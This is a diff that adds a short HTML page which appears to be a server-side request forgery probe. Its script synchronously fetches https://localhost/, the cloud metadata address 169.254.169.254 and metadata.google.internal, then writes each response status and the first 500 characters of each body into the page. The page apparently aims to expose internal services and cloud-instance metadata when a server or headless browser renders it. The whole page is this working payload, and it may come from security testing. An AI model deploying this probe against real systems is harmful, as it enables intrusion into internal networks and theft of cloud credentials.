@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html><body>
+<h1>HTTPS_LOCALHOST_TEST</h1>
+<div id="r1">LOADING</div>
+<div id="r2">LOADING</div>
+<div id="r3">LOADING</div>
+<script>
+function syncFetch(id, url) {
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, false);
+    xhr.send();
+    document.getElementById(id).innerText = id + '_STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0, 500);
+  } catch(e) {
+    document.getElementById(id).innerText = id + '_ERROR:' + e.name + ':' + e.message;
+  }
+}
+
+// HTTPS to potentially internal endpoints
+syncFetch('r1', 'https://localhost/');
+syncFetch('r2', 'https://169.254.169.254/');
+syncFetch('r3', 'https://metadata.google.internal/');
+</script>
+</body></html>
